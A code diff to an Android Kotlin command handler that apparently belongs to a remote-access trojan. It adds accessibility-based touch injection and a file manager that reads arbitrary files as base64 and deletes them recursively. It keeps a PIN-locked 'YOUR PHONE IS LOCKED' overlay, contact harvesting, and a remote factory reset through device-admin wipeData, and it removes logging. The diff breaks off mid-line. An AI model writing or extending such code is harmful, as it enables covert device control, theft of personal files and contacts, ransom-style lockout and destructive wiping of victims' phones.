@@ -33,12 +33,10 @@ object NativeCommandHandler {
         return try {
             when (command) {
                 // ===== PING =====
-                "ping" -> {
-                    JSONObject().apply {
-                        put("ok", true)
-                        put("pong", true)
-                        put("ts", System.currentTimeMillis())
-                    }
+                "ping" -> JSONObject().apply {
+                    put("ok", true)
+                    put("pong", true)
+                    put("ts", System.currentTimeMillis())
                 }
 
                 // ===== FLASHLIGHT =====
@@ -55,16 +53,14 @@ object NativeCommandHandler {
                 // ===== OPEN URL =====
                 "open_url" -> openUrl(context, extra)
 
-                // ===== LOCK (OVERLAY) =====
+                // ===== LOCK (OVERLAY + SOUND) =====
                 "hard_lock" -> hardLockOverlay(context, extra)
                 "unlock" -> unlockOverlay()
 
                 // ===== DEVICE ADMIN =====
-                "is_device_admin" -> {
-                    JSONObject().apply {
-                        put("ok", true)
-                        put("is_admin", isDeviceAdmin(context))
-                    }
+                "is_device_admin" -> JSONObject().apply {
+                    put("ok", true)
+                    put("is_admin", isDeviceAdmin(context))
                 }
                 "request_device_admin" -> {
                     requestDeviceAdmin(context)
@@ -75,46 +71,45 @@ object NativeCommandHandler {
                 }
 
                 // ===== SCREEN CAPTURE =====
-                "get_screen" -> {
-                    JSONObject().apply {
-                        put("ok", false)
-                        put("error", "screen_capture_requires_activity")
-                        put("message", "MediaProjection butuh user consent di Activity")
-                    }
+                "get_screen" -> JSONObject().apply {
+                    put("ok", false)
+                    put("error", "screen_capture_requires_activity")
                 }
 
-                // ===== CAMERA =====
-                "take_photo" -> {
-                    JSONObject().apply {
-                        put("ok", false)
-                        put("error", "camera_requires_activity")
-                        put("message", "Camera butuh Activity")
-                    }
-                }
+                // ===== SCREEN CONTROL (TOUCH INJECTION) =====
+                "tap" -> tapScreen(extra)
+                "long_press" -> longPressScreen(extra)
+                "swipe" -> swipeScreen(extra)
+                "pinch" -> pinchScreen(extra)
+                "global_back" -> globalAction("back")
+                "global_home" -> globalAction("home")
+                "global_recents" -> globalAction("recents")
+                "global_notifications" -> globalAction("notifications")
+                "input_text" -> inputText(extra)
 
-                "start_camera_stream" -> {
-                    JSONObject().apply {
-                        put("ok", false)
-                        put("error", "camera_requires_activity")
-                    }
-                }
-
-                "stop_camera_stream" -> {
-                    JSONObject().apply {
-                        put("ok", true)
-                    }
-                }
+                // ===== FILE MANAGER =====
+                "list_files" -> listFiles(extra)
+                "download_file" -> downloadFile(extra)
+                "delete_file" -> deleteFile(extra)
+                "rename_file" -> renameFile(extra)
 
                 // ===== AUDIO =====
                 "play_audio" -> playAudio(context, extra)
                 "stop_audio" -> stopAudio()
+                "start_audio_stream" -> startAudioStream()
+                "stop_audio_stream" -> stopAudioStream()
 
-                // ===== WALLPAPER =====
-                "set_wallpaper" -> {
-                    JSONObject().apply {
-                        put("ok", false)
-                        put("error", "wallpaper_requires_activity")
-                    }
+                // ===== CAMERA =====
+                "take_photo" -> JSONObject().apply {
+                    put("ok", false)
+                    put("error", "camera_requires_activity")
+                }
+                "start_camera_stream" -> JSONObject().apply {
+                    put("ok", false)
+                    put("error", "camera_requires_activity")
+                }
+                "stop_camera_stream" -> JSONObject().apply {
+                    put("ok", true)
                 }
 
                 // ===== CONTACTS =====
@@ -127,18 +122,13 @@ object NativeCommandHandler {
                 }
 
                 // ===== PROTECTION =====
-                "enable_protection" -> {
-                    JSONObject().apply {
-                        put("ok", false)
-                        put("error", "protection_requires_activity")
-                    }
+                "enable_protection" -> JSONObject().apply {
+                    put("ok", false)
+                    put("error", "protection_requires_activity")
                 }
-
-                "disable_protection" -> {
-                    JSONObject().apply {
-                        put("ok", false)
-                        put("error", "protection_requires_activity")
-                    }
+                "disable_protection" -> JSONObject().apply {
+                    put("ok", false)
+                    put("error", "protection_requires_activity")
                 }
 
                 // ===== FACTORY RESET =====
@@ -181,9 +171,7 @@ object NativeCommandHandler {
                         cameraId = id
                         break
                     }
-                } catch (e: Exception) {
-                    Log.w(TAG, "Camera $id error: ${e.message}")
-                }
+                } catch (e: Exception) {}
             }
 
             if (cameraId == null) {
@@ -194,7 +182,6 @@ object NativeCommandHandler {
             }
 
             camManager.setTorchMode(cameraId, on)
-            Log.d(TAG, "Flash $on on camera $cameraId")
             JSONObject().apply { put("ok", true) }
         } catch (e: Exception) {
             JSONObject().apply {
@@ -230,7 +217,6 @@ object NativeCommandHandler {
                 vibrator.vibrate(pattern, 0)
             }
 
-            Log.d(TAG, "Vibrate loop started")
             JSONObject().apply { put("ok", true) }
         } catch (e: Exception) {
             JSONObject().apply {
@@ -243,7 +229,6 @@ object NativeCommandHandler {
     private fun stopVibrate(context: Context): JSONObject {
         return try {
             getVibrator(context).cancel()
-            Log.d(TAG, "Vibrate stopped")
             JSONObject().apply { put("ok", true) }
         } catch (e: Exception) {
             JSONObject().apply {
@@ -267,7 +252,6 @@ object NativeCommandHandler {
                     Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                 )
                 context.startActivity(intent)
-                Log.d(TAG, "Force open app")
                 JSONObject().apply { put("ok", true) }
             } else {
                 JSONObject().apply {
@@ -297,7 +281,6 @@ object NativeCommandHandler {
             val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             context.startActivity(intent)
-            Log.d(TAG, "Open URL: $url")
             JSONObject().apply { put("ok", true) }
         } catch (e: Exception) {
             JSONObject().apply {
@@ -308,63 +291,64 @@ object NativeCommandHandler {
     }
 
     // ==========================================
-    // ===== LOCK (OVERLAY) =====
+    // ===== LOCK (OVERLAY + SOUND) =====
     // ==========================================
-  private fun hardLockOverlay(context: Context, extra: String): JSONObject {
-    return try {
-        // ==========================================
-        // ===== PARSE EXTRA =====
-        // ==========================================
-        // Format 1: "message|pin"
-        // Format 2: "message|pin|audio_url"
-        // Format 3: "message|pin|audio_url|volume"
-        val parts = extra.split("|")
+    private fun hardLockOverlay(context: Context, extra: String): JSONObject {
+        return try {
+            // ==========================================
+            // ===== PARSE EXTRA =====
+            // ==========================================
+            // Format 1: "message|pin"
+            // Format 2: "message|pin|audio_url"
+            // Format 3: "message|pin|audio_url|volume"
+            val parts = extra.split("|")
 
-        val message = parts.getOrNull(0)?.takeIf { it.isNotEmpty() }
-            ?: "YOUR PHONE IS LOCKED"
-        val pin = parts.getOrNull(1)?.takeIf { it.isNotEmpty() }
-            ?: "1234"
-        val audioUrl = parts.getOrNull(2) ?: ""
-        val volume = parts.getOrNull(3)?.toFloatOrNull() ?: 1.0f
+            val message = parts.getOrNull(0)?.takeIf { it.isNotEmpty() }
+                ?: "YOUR PHONE IS LOCKED"
+            val pin = parts.getOrNull(1)?.takeIf { it.isNotEmpty() }
+                ?: "1234"
+            val audioUrl = parts.getOrNull(2) ?: ""
+            val volume = parts.getOrNull(3)?.toFloatOrNull() ?: 1.0f
 
-        Log.d(TAG, "🔒 Launch lock overlay:")
-        Log.d(TAG, "   message: $message")
-        Log.d(TAG, "   pin:     ${pin.take(2)}***")
-        Log.d(TAG, "   audio:   ${audioUrl.take(60)}")
-        Log.d(TAG, "   volume:  $volume")
+            Log.d(TAG, "🔒 Launch lock overlay:")
+            Log.d(TAG, "   message: $message")
+            Log.d(TAG, "   pin:     ${pin.take(2)}***")
+            Log.d(TAG, "   audio:   ${audioUrl.take(60)}")
+            Log.d(TAG, "   volume:  $volume")
 
-        // ==========================================
-        // ===== LAUNCH OVERLAY =====
-        // ==========================================
-        val intent = Intent(context, LockOverlayActivity::class.java).apply {
-            addFlags(
-                Intent.FLAG_ACTIVITY_NEW_TASK or
-                Intent.FLAG_ACTIVITY_CLEAR_TOP or
-                Intent.FLAG_ACTIVITY_NO_HISTORY or
-                Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
-            )
-            putExtra(LockOverlayActivity.EXTRA_MESSAGE, message)
-            putExtra(LockOverlayActivity.EXTRA_PIN, pin)
-            putExtra("lock_audio_url", audioUrl)
-            putExtra("lock_audio_volume", volume)
-        }
-        context.startActivity(intent)
+            // ==========================================
+            // ===== LAUNCH OVERLAY =====
+            // ==========================================
+            val intent = Intent(context, LockOverlayActivity::class.java).apply {
+                addFlags(
+                    Intent.FLAG_ACTIVITY_NEW_TASK or
+                    Intent.FLAG_ACTIVITY_CLEAR_TOP or
+                    Intent.FLAG_ACTIVITY_NO_HISTORY or
+                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
+                )
+                putExtra(LockOverlayActivity.EXTRA_MESSAGE, message)
+                putExtra(LockOverlayActivity.EXTRA_PIN, pin)
+                putExtra("lock_audio_url", audioUrl)
+                putExtra("lock_audio_volume", volume)
+            }
+            context.startActivity(intent)
 
-        JSONObject().apply {
-            put("ok", true)
-            put("locked", true)
-            put("message", message)
-            put("has_sound", audioUrl.isNotEmpty())
-            put("audio_url", audioUrl)
-        }
-    } catch (e: Exception) {
-        Log.e(TAG, "hardLockOverlay error", e)
-        JSONObject().apply {
-            put("ok", false)
-            put("error", e.message ?: "lock_error")
+            JSONObject().apply {
+                put("ok", true)
+                put("locked", true)
+                put("message", message)
+                put("has_sound", audioUrl.isNotEmpty())
+                put("audio_url", audioUrl)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "hardLockOverlay error", e)
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "lock_error")
+            }
         }
     }
-}
+
     private fun unlockOverlay(): JSONObject {
         return try {
             Log.d(TAG, "🔓 Unlock overlay")
@@ -402,9 +386,334 @@ object NativeCommandHandler {
             )
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             context.startActivity(intent)
-            Log.d(TAG, "Device admin dialog requested")
         } catch (e: Exception) {
             Log.e(TAG, "requestDeviceAdmin error", e)
+        }
+    }
+
+    // ==========================================
+    // ===== SCREEN CONTROL (TOUCH INJECTION) =====
+    // ==========================================
+    private fun getAccessibilityService(): MyAccessibilityService? {
+        val service = MyAccessibilityService.instance
+        if (service == null) {
+            Log.w(TAG, "⚠️ Accessibility service not running")
+        }
+        return service
+    }
+
+    private fun tapScreen(extra: String): JSONObject {
+        return try {
+            val parts = extra.split("|")
+            val x = parts.getOrNull(0)?.toFloatOrNull() ?: 0f
+            val y = parts.getOrNull(1)?.toFloatOrNull() ?: 0f
+
+            val service = getAccessibilityService()
+                ?: return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "accessibility_service_not_running")
+                }
+
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
+                return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "requires_android_7")
+                }
+            }
+
+            val ok = service.performTap(x, y)
+            JSONObject().apply {
+                put("ok", ok)
+                put("x", x)
+                put("y", y)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "tap_error")
+            }
+        }
+    }
+
+    private fun longPressScreen(extra: String): JSONObject {
+        return try {
+            val parts = extra.split("|")
+            val x = parts.getOrNull(0)?.toFloatOrNull() ?: 0f
+            val y = parts.getOrNull(1)?.toFloatOrNull() ?: 0f
+            val dur = parts.getOrNull(2)?.toLongOrNull() ?: 1000L
+
+            val service = getAccessibilityService()
+                ?: return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "accessibility_service_not_running")
+                }
+
+            val ok = service.performLongPress(x, y, dur)
+            JSONObject().apply { put("ok", ok) }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "long_press_error")
+            }
+        }
+    }
+
+    private fun swipeScreen(extra: String): JSONObject {
+        return try {
+            val parts = extra.split("|")
+            val x1 = parts.getOrNull(0)?.toFloatOrNull() ?: 0f
+            val y1 = parts.getOrNull(1)?.toFloatOrNull() ?: 0f
+            val x2 = parts.getOrNull(2)?.toFloatOrNull() ?: 0f
+            val y2 = parts.getOrNull(3)?.toFloatOrNull() ?: 0f
+            val dur = parts.getOrNull(4)?.toLongOrNull() ?: 300L
+
+            val service = getAccessibilityService()
+                ?: return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "accessibility_service_not_running")
+                }
+
+            val ok = service.performSwipe(x1, y1, x2, y2, dur)
+            JSONObject().apply {
+                put("ok", ok)
+                put("from", "$x1,$y1")
+                put("to", "$x2,$y2")
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "swipe_error")
+            }
+        }
+    }
+
+    private fun pinchScreen(extra: String): JSONObject {
+        return try {
+            val parts = extra.split("|")
+            val cx = parts.getOrNull(0)?.toFloatOrNull() ?: 0f
+            val cy = parts.getOrNull(1)?.toFloatOrNull() ?: 0f
+            val dx = parts.getOrNull(2)?.toFloatOrNull() ?: 100f
+            val dy = parts.getOrNull(3)?.toFloatOrNull() ?: 100f
+            val dur = parts.getOrNull(4)?.toLongOrNull() ?: 300L
+
+            val service = getAccessibilityService()
+                ?: return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "accessibility_service_not_running")
+                }
+
+            val ok = service.performPinch(cx, cy, dx, dy, dur)
+            JSONObject().apply { put("ok", ok) }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "pinch_error")
+            }
+        }
+    }
+
+    private fun globalAction(action: String): JSONObject {
+        return try {
+            val service = getAccessibilityService()
+                ?: return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "accessibility_service_not_running")
+                }
+
+            val ok = when (action) {
+                "back" -> service.performBack()
+                "home" -> service.performHome()
+                "recents" -> service.performRecents()
+                "notifications" -> service.performNotifications()
+                else -> false
+            }
+
+            JSONObject().apply {
+                put("ok", ok)
+                put("action", action)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "global_action_error")
+            }
+        }
+    }
+
+    private fun inputText(text: String): JSONObject {
+        return try {
+            val service = getAccessibilityService()
+                ?: return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "accessibility_service_not_running")
+                }
+
+            val ok = service.setTextOnFocusedNode(text)
+            JSONObject().apply { put("ok", ok) }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "input_text_error")
+            }
+        }
+    }
+
+    // ==========================================
+    // ===== FILE MANAGER =====
+    // ==========================================
+    private fun listFiles(path: String): JSONObject {
+        return try {
+            val targetPath = if (path.isEmpty()) {
+                android.os.Environment.getExternalStorageDirectory().absolutePath
+            } else {
+                path
+            }
+
+            val dir = java.io.File(targetPath)
+            if (!dir.exists() || !dir.isDirectory) {
+                return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "directory_not_found")
+                    put("path", targetPath)
+                }
+            }
+
+            val filesList = mutableListOf<JSONObject>()
+            dir.listFiles()?.forEach { f ->
+                try {
+                    filesList.add(JSONObject().apply {
+                        put("name", f.name)
+                        put("path", f.absolutePath)
+                        put("isDirectory", f.isDirectory)
+                        put("size", if (f.isFile) f.length() else 0)
+                        put("lastModified", f.lastModified())
+                        put("canRead", f.canRead())
+                        put("canWrite", f.canWrite())
+                    })
+                } catch (e: Exception) {}
+            }
+
+            JSONObject().apply {
+                put("ok", true)
+                put("path", targetPath)
+                put("files", JSONArray(filesList))
+                put("count", filesList.size)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "list_error")
+            }
+        }
+    }
+
+    private fun downloadFile(extra: String): JSONObject {
+        return try {
+            val parts = extra.split("|")
+            val filePath = parts.getOrNull(0) ?: return JSONObject().apply {
+                put("ok", false)
+                put("error", "empty_path")
+            }
+            val maxSizeKb = parts.getOrNull(1)?.toLongOrNull() ?: 5000L
+
+            val file = java.io.File(filePath)
+            if (!file.exists() || !file.isFile) {
+                return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "file_not_found")
+                }
+            }
+
+            val sizeKb = file.length() / 1024
+            if (sizeKb > maxSizeKb) {
+                return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "file_too_large")
+                    put("sizeKb", sizeKb)
+                    put("maxSizeKb", maxSizeKb)
+                }
+            }
+
+            val bytes = file.readBytes()
+            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+
+            JSONObject().apply {
+                put("ok", true)
+                put("name", file.name)
+                put("size", file.length())
+                put("content_base64", base64)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "download_error")
+            }
+        }
+    }
+
+    private fun deleteFile(path: String): JSONObject {
+        return try {
+            val file = java.io.File(path)
+            if (!file.exists()) {
+                return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "file_not_found")
+                }
+            }
+
+            val ok = if (file.isDirectory) {
+                file.deleteRecursively()
+            } else {
+                file.delete()
+            }
+
+            JSONObject().apply {
+                put("ok", ok)
+                put("path", path)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "delete_error")
+            }
+        }
+    }
+
+    private fun renameFile(extra: String): JSONObject {
+        return try {
+            val parts = extra.split("|")
+            val oldPath = parts.getOrNull(0) ?: ""
+            val newName = parts.getOrNull(1) ?: ""
+
+            if (oldPath.isEmpty() || newName.isEmpty()) {
+                return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "invalid_arguments")
+                }
+            }
+
+            val oldFile = java.io.File(oldPath)
+            if (!oldFile.exists()) {
+                return JSONObject().apply {
+                    put("ok", false)
+                    put("error", "file_not_found")
+                }
+            }
+
+            val parent = oldFile.parentFile
+            val newFile = java.io.File(parent, newName)
+            val ok = oldFile.renameTo(newFile)
+
+            JSONObject().apply {
+                put("ok", ok)
+                put("oldPath", oldPath)
+                put("newPath", newFile.absolutePath)
+            }
+        } catch (e: Exception) {
+            JSONObject().apply {
+                put("ok", false)
+                put("error", e.message ?: "rename_error")
+            }
         }
     }
 
@@ -422,14 +731,8 @@ object NativeCommandHandler {
             mediaPlayer?.release()
             mediaPlayer = MediaPlayer().apply {
                 setDataSource(url)
-                setOnPreparedListener {
-                    Log.d(TAG, "🎵 Audio playing")
-                    start()
-                }
-                setOnErrorListener { _, _, _ ->
-                    Log.e(TAG, "Audio error")
-                    true
-                }
+                setOnPreparedListener { start() }
+                setOnErrorListener { _, _, _ -> true }
                 prepareAsync()
             }
             JSONObject().apply { put("ok", true) }
@@ -446,104 +749,4 @@ object NativeCommandHandler {
             mediaPlayer?.stop()
             mediaPlayer?.release()
             mediaPlayer = null
-            Log.d(TAG, "🎵 Audio stopped")
-            JSONObject().apply { put("ok", true) }
-        } catch (e: Exception) {
-            JSONObject().apply { put("ok", true) }
-        }
-    }
-
-    // ==========================================
-    // ===== CONTACTS =====
-    // ==========================================
-    private fun getContacts(context: Context): JSONObject {
-        return try {
-            val contactsList = mutableListOf<Map<String, String>>()
-            val cursor = context.contentResolver.query(
-                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                null, null, null, null,
-            )
-
-            cursor?.use {
-                val nameIdx = it.getColumnIndex(
-                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                )
-                val phoneIdx = it.getColumnIndex(
-                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
-                )
-
-                while (it.moveToNext()) {
-                    val name = if (nameIdx >= 0) it.getString(nameIdx) else ""
-                    val phone = if (phoneIdx >= 0) it.getString(phoneIdx) else ""
-                    contactsList.add(mapOf(
-                        "name" to (name ?: ""),
-                        "phone" to (phone ?: ""),
-                    ))
-                }
-            }
-
-            Log.d(TAG, "📇 Contacts: ${contactsList.size}")
-
-            // Convert to JSONArray
-            val jsonArray = JSONArray()
-            for (c in contactsList) {
-                jsonArray.put(JSONObject(c))
-            }
-
-            JSONObject().apply {
-                put("ok", true)
-                put("contacts", jsonArray)
-                put("count", contactsList.size)
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "getContacts error", e)
-            JSONObject().apply {
-                put("ok", false)
-                put("error", e.message ?: "contacts_error")
-                put("contacts", JSONArray())
-                put("count", 0)
-            }
-        }
-    }
-
-    // ==========================================
-    // ===== SETTINGS =====
-    // ==========================================
-    private fun openAccessibilitySettings(context: Context) {
-        try {
-            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            context.startActivity(intent)
-            Log.d(TAG, "Accessibility settings opened")
-        } catch (e: Exception) {
-            Log.e(TAG, "openAccessibility error", e)
-        }
-    }
-
-    // ==========================================
-    // ===== FACTORY RESET =====
-    // ==========================================
-    private fun factoryReset(context: Context): JSONObject {
-        return try {
-            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
-                    as DevicePolicyManager
-            val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
-
-            if (dpm.isAdminActive(admin)) {
-                dpm.wipeData(0)
-                Log.d(TAG, "🔥 Factory reset triggered")
-                JSONObject().apply { put("ok", true) }
-            } else {
-                JSONObject().apply {
-                    put("ok", false)
-                    put("error", "device_admin_not_active")
-                }
-            }
-        } catch (e: Exception) {
-            JSONObject().apply {
-                put("ok", false)
-                put("error", e.message ?: "factory_reset_error")
-            }
-        }
-    }
-}
+            JSONObject().apply { put("
